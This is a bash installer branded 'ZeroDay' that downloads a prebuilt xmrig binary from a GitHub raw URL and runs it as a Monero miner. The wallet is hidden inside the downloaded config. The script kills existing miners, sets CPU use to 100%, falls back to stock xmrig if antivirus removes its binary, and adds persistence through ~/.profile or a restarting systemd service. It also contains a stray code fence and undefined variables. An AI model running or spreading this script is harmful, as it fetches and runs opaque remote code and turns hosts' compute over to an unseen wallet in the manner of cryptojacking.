#!/bin/bash

VERSION=2.11

# printing greetings

echo "ZeroDay mining setup script v$VERSION."
echo "WARNING: Do not use this script for illegal purposes. If found using this script on servers not owned by you, we will ban the illegal wallet addresses and collect relevant information to submit to the police."
echo "(please report issues to support@ZeroDay.com email with full output of this script with extra \"-x\" \"bash\" option)"
echo

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not advised to run this script under root"
fi

# command line arguments
EMAIL=$1 # this one is optional

# checking prerequisites

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

# calculating port

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

get_port_based_on_hashrate() {
  local hashrate=$1
  if [ "$hashrate" -le "5000" ]; then
    echo 80
  elif [ "$hashrate" -le "25000" ]; then
    if [ "$hashrate" -gt "5000" ]; then
      echo 13333
    else
      echo 443
    fi
  elif [ "$hashrate" -le "50000" ]; then
    if [ "$hashrate" -gt "25000" ]; then
      echo 15555
    else
      echo 14444
    fi
  elif [ "$hashrate" -le "100000" ]; then
    if [ "$hashrate" -gt "50000" ]; then
      echo 19999
    else
      echo 17777
    fi
  elif [ "$hashrate" -le "1000000" ]; then
    echo 23333
  else
    echo "ERROR: Hashrate too high"
    exit 1
  fi
}

PORT=$(get_port_based_on_hashrate $EXP_MONERO_HASHRATE)
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

echo "Computed port: $PORT"


# printing intentions

echo "I will download, setup and run in background Monero CPU miner."
echo "If needed, miner in foreground can be started by $HOME/ZeroDay/miner.sh script."
echo "Mining will happen to the wallet already specified in the config."
if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at https://ZeroDay.com site)"
fi
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
else
  echo "Mining in background will be performed using ZeroDay_miner systemd service."
fi

echo
echo "JFYI: This host has $CPU_THREADS CPU threads with $CPU_MHZ MHz and ${TOTAL_CACHE}KB data cache in total, so projected Monero hashrate is around $EXP_MONERO_HASHRATE H/s."
echo

echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
sleep 15
echo
echo

# start doing stuff: preparing miner

echo "[*] Removing previous ZeroDay miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop ZeroDay_miner.service
fi
killall -9 xmrig

echo "[*] Removing $HOME/ZeroDay directory"
rm -rf $HOME/ZeroDay

echo "[*] Downloading ZeroDay advanced version of xmrig to /tmp/xmrig.tar.gz"
 if ! curl -L --progress-bar "https://raw.githubusercontent.com/ZeroDayx/x/refs/heads/main/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://raw.githubusercontent.com/ZeroDayx/x/refs/heads/main/xmrig.tar.gz"
  exit 1
fi

echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/ZeroDay"
[ -d $HOME/ZeroDay ] || mkdir $HOME/ZeroDay
if ! tar xf /tmp/xmrig.tar.gz -C $HOME/ZeroDay; then
  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/ZeroDay directory"
  exit 1
fi
rm /tmp/xmrig.tar.gz

echo "[*] Checking if advanced version of $HOME/ZeroDay/xmrig works fine (and not removed by antivirus software)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/ZeroDay/config.json
$HOME/ZeroDay/xmrig --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/ZeroDay/xmrig ]; then
    echo "WARNING: Advanced version of $HOME/ZeroDay/xmrig is not functional"
  else
    echo "WARNING: Advanced version of $HOME/ZeroDay/xmrig was removed by antivirus (or some other problem)"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
    exit 1
  fi

  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/ZeroDay"
  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/ZeroDay --strip=1; then
    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/ZeroDay directory"
  fi
  rm /tmp/xmrig.tar.gz

  echo "[*] Checking if stock version of $HOME/ZeroDay/xmrig works fine (and not removed by antivirus software)"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/ZeroDay/config.json
  $HOME/ZeroDay/xmrig --help >/dev/null
  if (test $? -ne 0); then
    if [ -f $HOME/ZeroDay/xmrig ]; then
      echo "ERROR: Stock version of $HOME/ZeroDay/xmrig is not functional too"
    else
      echo "ERROR: Stock version of $HOME/ZeroDay/xmrig was removed by antivirus too"
    fi
    exit 1
  fi
fi

echo "[*] Miner $HOME/ZeroDay/xmrig is OK"

PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi

# Remove wallet and pool server options
# Assuming the wallet and pool server are already set in config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/ZeroDay/config.json
sed -i 's#"log-file": *null,#"log-file": "'$HOME/ZeroDay/xmrig.log'",#' $HOME/ZeroDay/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/ZeroDay/config.json

cp $HOME/ZeroDay/config.json $HOME/ZeroDay/config_background.json
sed -i 's/"background": *false,/"background ": true,/' $HOME/ZeroDay/config_background.json

# preparing script

echo "[*] Creating $HOME/ZeroDay/miner.sh script"
cat >$HOME/ZeroDay/miner.sh <<EOL
#!/bin/bash
if ! pidof xmrig >/dev/null; then
  nice $HOME/ZeroDay/xmrig \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
fi
EOL

chmod +x $HOME/ZeroDay/miner.sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep ZeroDay/miner.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/ZeroDay/miner.sh script to $HOME/.profile"
    echo "$HOME/ZeroDay/miner.sh --config=$HOME/ZeroDay/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else
    echo "Looks like $HOME/ZeroDay/miner.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in $HOME/ZeroDay/xmrig.log file)"
  /bin/bash $HOME/ZeroDay/miner.sh --config=$HOME/ZeroDay/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo "[*] Running miner in the background (see logs in $HOME/ZeroDay/xmrig.log file)"
    /bin/bash $HOME/ZeroDay/miner.sh --config=$HOME/ZeroDay/config_background.json >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

    echo "[*] Creating ZeroDay_miner systemd service"
    cat >/tmp/ZeroDay_miner.service <<EOL
[Unit]
Description=Monero miner service

[Service]
ExecStart=$HOME/ZeroDay/xmrig --config=$HOME/ZeroDay/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/ZeroDay_miner.service /etc/systemd/system/ZeroDay_miner.service
    echo "[*] Starting ZeroDay_miner systemd service"
    sudo killall xmrig 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable ZeroDay_miner.service
    sudo systemctl start ZeroDay_miner.service
    echo "To see miner service logs run \"sudo journalctl -u ZeroDay_miner -f\" command"
  fi
fi

echo ""
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similar commands under root to limit miner to 75% percent CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b"
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
    echo "sudo sed -i -e '\$a cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  else
    echo "sudo sed -i -e '\$i \\cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/ZeroDay/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/ZeroDay/config_background.json"
fi ```bash
echo ""

echo "[*] Setup complete"